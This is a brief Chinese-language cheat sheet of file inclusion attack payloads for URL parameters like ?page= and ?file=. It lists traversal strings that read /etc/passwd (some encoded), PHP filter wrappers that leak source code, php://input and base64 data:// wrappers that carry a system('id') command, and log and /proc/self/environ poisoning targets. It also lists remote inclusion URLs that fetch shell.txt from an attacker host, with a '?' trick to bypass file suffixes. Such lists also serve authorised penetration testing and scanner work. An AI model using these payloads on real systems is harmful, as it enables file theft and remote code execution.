# 文件包含 (LFI/RFI)

适用于 URL 参数中直接引用文件路径的场景（?page=、?file=）。

## 本地文件包含 (LFI)

- /etc/passwd
- ../../../etc/passwd
- ....//....//....//etc/passwd
- ..%2f..%2f..%2fetc%2fpasswd
- php://filter/convert.base64-encode/resource=index.php
- php://filter/read=convert.base64-encode/resource=index.php
- php://input (POST: <?php system('id'); ?>)
- data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
- expect://id
- /var/log/apache2/access.log
- /proc/self/environ

## 远程文件包含 (RFI)

- http://attacker.com/shell.txt
- http://attacker.com/shell.txt? (加 ? 绕过后缀)
- ftp://attacker.com/shell.txt